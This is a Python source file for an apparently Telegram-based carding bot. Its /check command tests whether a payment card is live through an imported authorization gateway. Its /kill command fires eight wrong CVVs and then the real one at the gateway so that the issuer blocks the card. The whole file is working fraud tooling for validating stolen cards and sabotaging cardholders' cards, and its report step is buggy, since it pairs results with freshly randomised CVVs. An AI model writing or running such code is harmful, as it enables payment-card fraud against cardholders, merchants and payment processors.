import asyncio
import random
from gates.authorize import authorize_check

async def kill_single_card(card, month, year, cvv, concurrency=2):
    """
    Core kill logic: 8 wrong CVV + 1 correct.
    Returns list of (status, message, is_live) for each attempt.
    """
    wrong = set()
    while len(wrong) < 8:
        w = str(random.randint(100,999)).zfill(3)
        if w != cvv:
            wrong.add(w)
    attempts = list(wrong) + [cvv]
    sem = asyncio.Semaphore(concurrency)
    async def limited(c):
        async with sem:
            return await authorize_check(card, month, year, c)
    tasks = [limited(c) for c in attempts]
    return await asyncio.gather(*tasks)

async def kill_cmd(update, context):
    """Inline /kill command handler."""
    if not context.args:
        await update.message.reply_text("❌ Use: /kill card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error.")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text("💀 Killing card...")
    results = await kill_single_card(card, month, year, cvv)
    live_found = any(r[2] is True for r in results)
    dead_found = any(r[2] is False for r in results)
    if dead_found and not live_found:
        final = "💀 KILLED (dead)"
    elif live_found:
        final = "⚠️ LIVE (kill failed)"
    else:
        final = "❓ UNKNOWN"
    # rebuild attempts list for display
    wrong = set()
    while len(wrong) < 8:
        w = str(random.randint(100,999)).zfill(3)
        if w != cvv:
            wrong.add(w)
    attempts_display = list(wrong) + [cvv]
    report_lines = [f"CVV {c}: {status} - {msg}" for c, (status, msg, _) in zip(attempts_display, results)]
    await update.message.reply_text(f"✅ Done.\n\n{final}\n\n" + "\n".join(report_lines))

async def check_cmd(update, context):
    """Inline /check command handler."""
    if not context.args:
        await update.message.reply_text("❌ Use: /check card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error.")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text("🔍 Checking card...")
    status, msg, live = await authorize_check(card, month, year, cvv)
    emoji = "✅" if live is True else "❌" if live is False else "⚠️"
    await update.message.reply_text(f"{emoji} **{status}**\n{msg}")
